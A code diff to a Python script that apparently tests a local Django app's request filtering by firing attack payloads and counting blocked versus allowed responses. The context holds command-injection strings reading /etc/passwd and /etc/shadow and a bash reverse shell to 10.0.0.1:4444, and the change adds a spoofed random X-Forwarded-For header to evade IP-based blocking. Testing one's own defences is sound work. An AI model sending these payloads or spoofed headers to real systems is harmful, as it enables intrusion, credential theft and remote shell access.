@@ -40,7 +40,7 @@ PAYLOADS = {
         ("GET", "/api/ping", {"host": "127.0.0.1; ls -la"}, {}),
         ("GET", "/api/ping", {"host": "127.0.0.1 | cat /etc/passwd"}, {}),
         ("POST", "/api/exec", {}, {"cmd": "`whoami`"}),
-        ("GET", "/api/check", {"url": "127.0.0.1 && id"}  , {}),
+        ("GET", "/api/check", {"url": "127.0.0.1 && id"}, {}),
         ("POST", "/api/process", {}, {"data": "$(cat /etc/shadow)"}),
         ("GET", "/run", {"cmd": "; /bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"}, {}),
     ],
@@ -83,9 +83,16 @@ def c(color, text):
     return f"{COLORS.get(color, '')}{text}{COLORS['RESET']}"
 
 
+def generate_random_ip():
+    return f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
+
+
 def send(method, path, params, body, extra_headers=None, session=None):
     url = BASE_URL + path
     headers = {"Accept": "text/html,application/json"}
+
+    headers["X-Forwarded-For"] = generate_random_ip()
+
     if extra_headers:
         headers.update(extra_headers)
 
@@ -129,25 +136,25 @@ def run_attack(attack_type, count=5, delay=0.3, verbose=True):
         status = send(method, path, params, body, session=session)
 
         if status == "CONN_ERR":
-            print(c("RED", f"  [{i+1}] Connection refused — is Django running?"))
+            print(c("RED", f"  [{i + 1}] Connection refused — is Django running?"))
             errors += 1
             break
         elif isinstance(status, str):
-            print(c("YELLOW", f"  [{i+1}] {status}"))
+            print(c("YELLOW", f"  [{i + 1}] {status}"))
             errors += 1
         elif status == 403:
             blocked += 1
             if verbose:
                 full = path + ("?" + urllib.parse.urlencode(params) if params else "")
-                print(c("RED", f"  [{i+1}] {method} {full[:60]} → {status} BLOCKED"))
+                print(c("RED", f"  [{i + 1}] {method} {full[:60]} → {status} BLOCKED"))
         elif status in (200, 301, 302, 404):
             allowed += 1
             if verbose:
                 full = path + ("?" + urllib.parse.urlencode(params) if params else "")
-                print(c("GREEN", f"  [{i+1}] {method} {full[:60]} → {status} OK"))
+                print(c("GREEN", f"  [{i + 1}] {method} {full[:60]} → {status} OK"))
         else:
             if verbose:
-                print(c("YELLOW", f"  [{i+1}] status={status}"))
+                print(c("YELLOW", f"  [{i + 1}] status={status}"))
 
         if delay > 0:
             time.sleep(delay)
